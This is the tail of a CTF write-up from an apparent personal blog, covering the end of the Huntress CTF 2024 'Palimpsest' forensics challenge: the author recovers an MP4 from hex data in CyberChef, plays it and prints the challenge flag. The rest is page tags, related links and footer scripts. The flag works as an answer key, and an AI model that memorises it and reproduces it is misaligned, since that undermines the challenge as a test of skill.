</div><p>Since the binary sections are significantly larger than the xml between, we can look for the start/end characters and just replace a range as long as the range is smaller than the binary.</p>
<p><img src="/post/huntress-ctf-2024/Images/Palimpsest_3.png"
	width="939"
	height="789"
	srcset="/post/huntress-ctf-2024/Images/Palimpsest_3_hu809427651419542148.png 480w, /post/huntress-ctf-2024/Images/Palimpsest_3_hu107981699231760004.png 1024w"
	loading="lazy"
	
		alt="Applying a replace with . Note how the size difference goes from 351101 to 289814."
	
	
		class="gallery-image" 
		data-flex-grow="119"
		data-flex-basis="285px"
	
></p>
<p>Lastly there is extra xml format at the end of the input I just removed manually. Now we can convert from hex, and save as an .mp4 file:</p>
<p><img src="/post/huntress-ctf-2024/Images/Palimpsest_4.png"
	width="1507"
	height="777"
	srcset="/post/huntress-ctf-2024/Images/Palimpsest_4_hu11290343246543156943.png 480w, /post/huntress-ctf-2024/Images/Palimpsest_4_hu14846749662854684257.png 1024w"
	loading="lazy"
	
		alt="Final CyberChef saving. I once again draw attention to the mp4 magic bytes."
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="465px"
	
></p>
<p>Now we can play the mp4 file and get the flag!</p>
<p><img src="/post/huntress-ctf-2024/Images/Palimpsest_5.png"
	width="1016"
	height="758"
	srcset="/post/huntress-ctf-2024/Images/Palimpsest_5_hu13517020557394109777.png 480w, /post/huntress-ctf-2024/Images/Palimpsest_5_hu9211002056480034094.png 1024w"
	loading="lazy"
	
		alt="Not sure how to remove the play menu at the bottom.."
	
	
		class="gallery-image" 
		data-flex-grow="134"
		data-flex-basis="321px"
	
></p>
<p><code>flag{2b7dff19886372f1z85ca267eb15zabe}</code></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/web/">Web</a>
        
            <a href="/tags/misc/">Misc</a>
        
            <a href="/tags/malware/">Malware</a>
        
            <a href="/tags/forensics/">Forensics</a>
        
            <a href="/tags/python/">Python</a>
        
            <a href="/tags/pickle/">Pickle</a>
        
            <a href="/tags/ssti/">SSTI</a>
        
            <a href="/tags/proxy/">Proxy</a>
        
            <a href="/tags/command-injection/">Command Injection</a>
        
            <a href="/tags/powershell/">Powershell</a>
        
            <a href="/tags/linux/">Linux</a>
        
            <a href="/tags/webhook/">Webhook</a>
        
            <a href="/tags/api/">API</a>
        
            <a href="/tags/ngrok/">Ngrok</a>
        
            <a href="/tags/sql-injection/">SQL Injection</a>
        
            <a href="/tags/zip-slip/">Zip Slip</a>
        
            <a href="/tags/cheat-engine/">Cheat Engine</a>
        
            <a href="/tags/wireshark/">Wireshark</a>
        
            <a href="/tags/zimmerman-tools/">Zimmerman Tools</a>
        
            <a href="/tags/cyberchef/">Cyberchef</a>
        
    </section>


    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/post/hack-the-boo-2023/">
        
        

        <div class="article-details">
            <h2 class="article-title">Hack The Boo 2023</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/post/hackthebox-cyber-apocalypse-2024/">
        
        
            <div class="article-image">
                <img src="/post/hackthebox-cyber-apocalypse-2024/ca-2024-ctf-background.d1ff26ab7326bd1a79b6d1e0a52f6aa6_hu13886050347455417942.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Cyber Apocalypse: 2024"
                        
                        data-hash="md5-0f8mq3MmvRp5ttHgpS9qpg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Cyber Apocalypse: 2024</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/post/picoctf_2023/">
        
        

        <div class="article-details">
            <h2 class="article-title">PicoCTF_2023</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/post/hackthebox_cyber_apocalypse_2023/">
        
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox_Cyber_Apocalypse_2023</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/post/nahamconctf_2023/">
        
        

        <div class="article-details">
            <h2 class="article-title">NahamConCTF_2023</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2023 - 
        
        2024 Spencer&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
